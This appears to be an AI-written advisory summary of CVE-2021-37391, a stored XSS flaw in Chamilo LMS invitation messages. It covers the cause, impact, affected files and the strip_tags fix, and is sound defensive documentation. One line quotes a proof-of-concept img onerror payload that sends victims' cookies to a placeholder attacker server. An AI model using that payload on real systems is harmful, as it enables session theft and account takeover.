Based on the provided content, here's the breakdown of CVE-2021-37391:

**Root Cause:**
- The vulnerability stems from a stored Cross-Site Scripting (XSS) flaw within the invitation message functionality of the Chamilo LMS 1.11.x platform.

**Weaknesses/Vulnerabilities:**
- **Stored XSS:** The application fails to properly sanitize user-supplied input when sending invitation messages. Specifically, the `content` parameter is not sanitized. This allows an attacker to inject malicious JavaScript code into the message content.
- **Insufficient input validation:** The `content` parameter from the invitation message functionality is not being properly sanitized before being stored, allowing the injection of HTML and JavaScript.

**Impact of Exploitation:**
- **Account takeover:** By exploiting this vulnerability, an attacker can steal the authentication cookies of other users, including administrators. This can lead to complete account takeover.
- **Arbitrary code execution:** The attacker can execute arbitrary code within the context of the victim's browser session.
- **Data Breaches:** Sensitive information can be accessed by exploiting this vulnerability, potentially causing data breaches.

**Attack Vectors:**
- **Social network invitation feature:** An attacker crafts a malicious invitation message containing a JavaScript payload.
- **`main/social/search.php`, `main/inc/lib/social.lib.php`:**  The vulnerability is triggered via the social network search feature when sending an invitation.
- **User interaction:** The victim user (e.g., administrator) has to view the invitation to trigger the malicious code.

**Required Attacker Capabilities/Position:**
- **Unprivileged user access:** The attacker needs to have an account within the Chamilo LMS and the ability to send invitations, which does not require elevated privileges.
- **Malicious Payload:** The attacker needs to craft an XSS payload and send it via the vulnerable functionality
- **Victim Interaction:** The attack requires the victim (admin) to view the invitation to trigger the XSS.

**Technical Details:**
- The provided code snippet shows the fix for the vulnerability. The code adds `strip_tags` to the `$content` variable in `main/inc/lib/social.lib.php` to strip HTML and script tags.
- The proof of concept payload provided in the document uses an `<img>` tag with an `onerror` event to exfiltrate the victim's cookies: `<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>`

**Mitigation:**
- The recommended fix is to update Chamilo LMS to the latest version, which includes the necessary patches.

**Additional Notes:**
- The provided content also highlights related vulnerabilities (CVE-2021-37390 and CVE-2021-37389) in Chamilo LMS, including reflected XSS and a backdoor implantation via stored XSS during the installation process.
